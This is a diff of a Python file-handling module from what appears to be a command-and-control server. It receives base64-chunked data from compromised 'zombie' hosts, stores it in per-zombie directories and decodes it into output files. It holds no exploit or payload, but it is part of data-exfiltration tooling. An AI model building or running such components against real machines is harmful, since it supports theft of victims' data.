@@ -3,6 +3,7 @@ import secrets
 from base64 import b64decode
 import logging
 from datetime import datetime
+from pathlib import Path
 
 """
 - Define way to interact with files on disk
@@ -12,7 +13,7 @@ logger = logging.getLogger("ioFiles")
 logging.basicConfig(level=logging.DEBUG, handlers=[
                         logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                         logging.StreamHandler()
-                    ], format="%(asctime)s |%(levelname)s| %(name)s->%(funcName)s => %(message)s    "
+                    ], format="%(asctime)s |%(levelname)s| %(name)s.%(funcName)s => %(message)s    "
                     )
 
 #print(f"[???] in server/ioFiles.py, name is: {__name__}")
@@ -25,66 +26,76 @@ REMOVE _build_dirs, expensive checks just to write files
 
 
 class ioFiles:
-    zombieID = ""
-    pre = ""
-    post = ""
-    
-    def __init__(self,zombieID:str):
+    """
+    ioFiles is how the server handles pulling and pushing files between the
+    zombie and host. 
+    """
+    def __init__(self,zombieID:str, basePath:str):
         self.zombieID = zombieID
-        self.pre = f"files/pre/{zombieID}"
-        self.post = f"files/post/{zombieID}"
-        self._build_dirs()
+        self.base_path = Path(basePath)
+        self.home = self.base_path / "files" / "zombies" / zombieID
+        logger.debug(f"home is now: {self.home}")
+        self._build_dirs(zombieID)
+        self.files = []
         return
 
-    def _build_dirs(self,path:str):
+    def _build_dirs(self,zombieID:str):
+        """
+            need to build main zombie folder, then sub folders
+        """
         try:
-            paths = [f"{path}/files/pre/",f"{path}/files/post/",f"{path}/files/stale"]
-            for x in paths:
-                print(f"IS_DIRECTORY => x: {x}")
-                res = path.exists(x)
-                if res == True:
-                    print(f"IS_DIRECTORY => Found: {x}")
-                    continue
-                else:
-                    print(f"IS_DIRECTORY => Didn't Find: {x}")
-                    try:
-                        res = makedirs(x)
-                        print(f"IS_DIRECTORY => Made directory: {x}")
-                        # if res == True:
-                        #     continue
-                        # else:
-                        #     print(f"IS_DIRECTORY => ERROR MAKING DIR: {x}")
-                        #     return False
-                    except:
-                        print(f"IS_DIRECTORY => EXCEPTION OCCURED WHILE MAKING DIR: {x}")
-                        return False
-            return True
-        except:
-            print("IS_DIRECTORY => ERROR, COULDN'T OPEN FS")
-            return False
+            self.home.mkdir() # first make sure zombie is built
+        except FileExistsError as e:
+            logger.debug("zombie home already created, skipping")
+            post = self.home / "post"
+            if post.exists():
+                logger.debug("zombie home already setup, skipping")
+                return
+        except Exception as e:
+            logger.error(f"Unable to create directory structure with error {e}")
+        pre = self.home / "pre"
+        post = self.home / "post"
+        #stale = self.home / "stale"
+        try:
+            pre.mkdir()
+            post.mkdir()
+            #stale.mkdir()
+        except FileExistsError as e:
+            logger.debug(f"Couldn't create sub directory with error: {e}")
+        except Exception as e:
+            logger.error(f"Unable to create directory structure with error {e}")
+        
+
+
+
         
     
     def write_chunk(self,data):
         # if(self.is_directory()):
-        print(f"WRITE_CHUNK => data is type: {type(data)}")
+        logger.debug(f"data is type: {type(data)}")
         try:
             # path = f"./files/pre/{zombieID}"
-            print(f"WRITE_CHUNK => NOW OPENING: {self.pre}")
+            pre = self.home / "pre"
+            token = secrets.token_urlsafe(6)
+            path = pre / token
+            logger.debug(f"NOW OPENING: {path}")
             try:
-                with open(self.pre,'a') as f:
+                with open(path,'a') as f:
                     res = f.write(data)
-                    print(f"WRITE_CHUNK => saved {res} bytes")
+                    logger.debug(f"saved {res} bytes")
+                    self.files.append(path)
                     f.close()
                     return True
             except FileNotFoundError as e:
-                print("WRITE_CHUNK => UNABLE TO WRITE, TRYING ALT....")
-                with open(self.pre,"w") as f:
+                logger.debug("Trying alt")
+                with open(path,"w") as f:
                     res = f.write(data)
-                    print(f"WRITE_CHUNK => saved {res} bytes")
+                    logger.debug(f"Saved {res} bytes")
+                    self.files.append(path)
                     f.close()
                     return True  
-        except:
-            print(f"WRITE_CHUNK => E1: UNABLE TO WRITE CHUNK: {data}")
+        except Exception as e:
+            logger.error(f"E1: UNABLE TO WRITE CHUNK: {data} for reason: {e}")
             return False
         # else:
         #     print(f"WRITE_CHUNK => E2: UNABLE TO WRITE CHUNK: {data}")
@@ -95,50 +106,50 @@ class ioFiles:
         - should be able to do something with split and 'CHUNK:'
     """
     def process_file(self,zombieID:str):
-        # pre = f"./files/pre/{zombieID}"
-        # post = f"./files/post/{zombieID}"
+        pre = self.files.pop()
+        post = self.home / "post"
         token = secrets.token_urlsafe(6)
-        postfile = f"{self.post}-{token}"
-        with open(self.pre,"r") as f:
+        postfile = post / token
+        with open(pre,"r") as f:
             pre_file = f.read()
             f.close()
         #prefile should now contain all chunks recieved from client
             # - need to split and decode each chunk before writting
         #print(f"PROCESS_FILE => preprocessed data found: {pre_file}")
-        chunks = pre_file.split("CHUNK:")
-        print(f"PROCESS_FILE => FOUND CHUNKS: {len(chunks)}")
+        chunks = pre_file.split("CHUNK:")[0:]
+        logger.debug(f"FOUND CHUNKS: {len(chunks)}")
         data = "" 
-        print(f"PROCESS_FILE => DECODED DATA, WRITTING")
+        logger.debug(f"DECODED DATA, WRITTING")
         try:
             for chunk in chunks:
-                #print(f"PROCESS_FILE => in for loop, chunk len: {len(chunk)}")
+                logger.debug(f"PROCESS_FILE => in for loop, chunk len: {len(chunk)}")
                 enc = b64decode(chunk)
                 data += enc.decode('utf-8')
             with open(postfile,"a") as f:
                 f.write(data)
                 f.close()
-        except:
-            print(f"PROCESS_FILE => ERROR, COUDLN'T DECODE")
-            print(f"PROCESS_FILE => SAVING RAW CHUNKS.....")
+        except Exception as e:
+            logger.error(f"ERROR, COUDLN'T DECODE: {e}")
+            logger.debug(f"SAVING RAW CHUNKS.....")
             with open(postfile,"w") as f:
                 f.write(pre_file)
                 f.close()     
         #print(f"PROCESS_FILE => now saving pre_file data to {postfile}")
         try:
             try:
-                print(f"PROCESS_FILE => now removing {self.pre}")
-                remove(self.pre)
+                logger.debug(f"now removing {pre_file}")
+                remove(pre)
                 return token
             except:
-                print(f"PROCESS_FILES => ERROR: COULDN'T REMOVE {self.pre}")
-                print("PROCESS_FILES => BACKING UP AND DELETING")
-                files = './files'
+                logger.error(f"COULDN'T REMOVE {pre}")
+                #logger.debug("BACKING UP AND DELETING")
+                #files = './files'
                 #Rename files directory and move out of way to be recreated by server
-                rename(files,f"./files-{token}")
-                remove(self.pre)
+                #rename(files,f"./files-{token}")
+                #remove(self.pre)
                 return None
-        except:
-            print(f"PROCESS_FILES => ERROR: UNABLE TO FAIL SAFELY")
+        except Exception as e:
+            logger.error(f"UNABLE TO FAIL SAFELY: {e}")
             return None
         
     
